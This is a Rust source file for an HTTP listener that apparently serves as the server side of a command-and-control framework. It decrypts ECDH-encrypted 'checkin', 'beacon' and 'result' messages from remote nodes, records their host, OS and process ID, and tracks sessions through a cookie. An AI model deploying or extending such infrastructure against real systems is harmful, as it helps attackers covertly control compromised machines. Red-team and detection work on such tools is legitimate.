use std::collections::HashMap;
use std::io::Read;
use std::sync::Mutex;


use base64::Engine;
use base64::engine::general_purpose::URL_SAFE_NO_PAD as BASE64;

use glimmer::crypto::SessionKey;
use glimmer::proto::{self, Envelope, MsgType};

use glimmer::keystore::KeyStore;


struct NodeState {
    session_key: SessionKey,
}

struct Server {
    nodes: Mutex<HashMap<String, NodeState>>,
    keystore: KeyStore,
}

impl Server {
    fn new() -> Self {
        let keystore = KeyStore::load("keys").expect("failed to load keystore");
        Server {
            nodes: Mutex::new(HashMap::new()),
            keystore,
        }
    }
}

fn main() {
    let addr = std::env::args()
        .nth(1)
        .unwrap_or_else(|| "0.0.0.0:8080".into());

    let server = std::sync::Arc::new(Server::new());

    let listener = std::net::TcpListener::bind(&addr).unwrap();
    eprintln!("[server] listening on {}", addr);

    for stream in listener.incoming() {
        let stream = match stream {
            Ok(s) => s,
            Err(e) => {
                eprintln!("[error] accept: {}", e);
                continue;
            }
        };

        let server = server.clone();
        std::thread::spawn(move || {
            if let Err(e) = handle_connection(stream, &server) {
                eprintln!("[error] connection: {}", e);
            }
        });
    }
}

fn handle_connection(
    mut stream: std::net::TcpStream,
    server: &Server,
) -> Result<(), Box<dyn std::error::Error>> {
    let (headers, body) = read_http_body(&mut stream)?;
    let node_id_hint = extract_node_id(&headers);
    // eprintln!("[debug] headers:\n{}", headers);
    // eprintln!("[debug] node_id_hint: {:?}", node_id_hint);

    glimmer::dbg_log!("headers:\n{:?}", headers);
    glimmer::dbg_log!("node_id_hint:\n{:?}", node_id_hint);

    let body = body.trim();

    // First 8 chars are hex key_id, rest is base64 payload
    if body.len() < 8 {
        return Err("body too short".into());
    }

    let key_id_hex = &body[..8];
    let payload_b64 = &body[8..];

    let _key_id = hex::decode(key_id_hex)?;
    let decoded = BASE64.decode(payload_b64)?;

    // TODO: use key_id to look up the correct server keypair
    // For now we only have one keypair so just decrypt

    let key_id_bytes: [u8; 4] = hex::decode(key_id_hex)?
    .try_into()
    .map_err(|_| "invalid key_id length")?;

    let (plaintext, _node_id) = try_decrypt(&decoded, &key_id_bytes, server, node_id_hint.as_deref())?;

    let envelope = Envelope::unmarshal(&plaintext)?;
    let ts = chrono::DateTime::from_timestamp(envelope.timestamp, 0)
        .map(|t| t.format("%H:%M:%S").to_string())
        .unwrap_or_else(|| "???".into());

    match envelope.msg_type {
        MsgType::Checkin => {
            if let Some(payload) = &envelope.payload {
                let checkin: proto::CheckinData = serde_json::from_slice(payload)?;
                eprintln!(
                    "[checkin] {} node={} os={}/{} host={} pid={} key_id={} [ECDH established]",
                    ts,
                    envelope.node_id,
                    checkin.os,
                    checkin.arch,
                    checkin.host,
                    checkin.pid,
                    key_id_hex,
                );
            }
        }
        MsgType::Beacon => {
            eprintln!("[beacon] {} node={} key_id={}", ts, envelope.node_id, key_id_hex);
        }
        MsgType::Result => {
            eprintln!(
                "[result] {} node={} payload={} bytes",
                ts,
                envelope.node_id,
                envelope.payload.as_ref().map(|p| p.len()).unwrap_or(0),
            );
        }
    }

    let response = "HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n";
    std::io::Write::write_all(&mut stream, response.as_bytes())?;

    Ok(())
}

fn try_decrypt(
    decoded: &[u8],
    key_id: &[u8; 4],
    server: &Server,
    node_id_hint: Option<&str>,
) -> Result<(Vec<u8>, Option<String>), Box<dyn std::error::Error>> {
    // Direct lookup for existing nodes
    if let Some(nid) = node_id_hint {
        let nodes = server.nodes.lock().unwrap_or_else(|e| e.into_inner());
        eprintln!("[debug] looking up node {}, known nodes: {}", nid, nodes.len());

        if let Some(state) = nodes.get(nid) {
            eprintln!("[debug] found session key, attempting decrypt");
            if let Ok(plain) = state.session_key.decrypt(decoded) {
                return Ok((plain, Some(nid.to_string())));
            }
            eprintln!("[debug] session key decrypt failed");
        }
    }

    // New checkin: look up server keypair by key_id
    if decoded.len() > 33 && (decoded[0] == 0x02 || decoded[0] == 0x03) {
        let keypair = server
            .keystore
            .get(key_id)
            .ok_or_else(|| format!("unknown key_id: {}", hex::encode(key_id)))?;

        let pub_key_bytes = &decoded[..33];
        let encrypted = &decoded[33..];

        let session_key = keypair.derive_session_key(pub_key_bytes)?;

        if let Ok(plain) = session_key.decrypt(encrypted) {
            if let Ok(env) = Envelope::unmarshal(&plain) {
                let node_id = env.node_id.clone();
                let mut nodes = server.nodes.lock().unwrap_or_else(|e| e.into_inner());
                nodes.insert(node_id.clone(), NodeState { session_key });
                return Ok((plain, Some(node_id)));
            }
        }
    }

    Err("could not decrypt".into())
}

fn read_http_body(stream: &mut std::net::TcpStream) -> Result<(String, String), Box<dyn std::error::Error>> {
    let mut headers_buf = Vec::new();
    let mut byte = [0u8; 1];

    // Read until we find \r\n\r\n
    loop {
        stream.read_exact(&mut byte)?;
        headers_buf.push(byte[0]);

        if headers_buf.len() >= 4
            && &headers_buf[headers_buf.len() - 4..] == b"\r\n\r\n"
        {
            break;
        }

        if headers_buf.len() > 8192 {
            return Err("headers too large".into());
        }
    }

    let headers = String::from_utf8_lossy(&headers_buf).to_string();

    // Extract Content-Length
    let content_length = headers
        .lines()
        .find(|line| line.to_lowercase().starts_with("content-length:"))
        .and_then(|line| line.split(':').nth(1))
        .and_then(|v| v.trim().parse::<usize>().ok())
        .unwrap_or(0);

    if content_length == 0 {
        return Err("no content-length".into());
    }

    if content_length > 1 << 20 {
        return Err("body too large".into());
    }

    // Read exactly content_length bytes
    let mut body = vec![0u8; content_length];
    stream.read_exact(&mut body)?;

    Ok((headers, String::from_utf8(body)?))
}

fn extract_node_id(headers: &str) -> Option<String> {
    headers
        .lines()
        .find(|line| line.to_lowercase().starts_with("cookie:"))
        .and_then(|line| {
            // Strip the "cookie:" prefix regardless of case
            let cookies = line.splitn(2, ':').nth(1)?.trim();
            cookies
                .split(';')
                .map(|c| c.trim())
                .find(|c| c.starts_with("sid="))
                .map(|c| c.trim_start_matches("sid=").to_string())
        })
}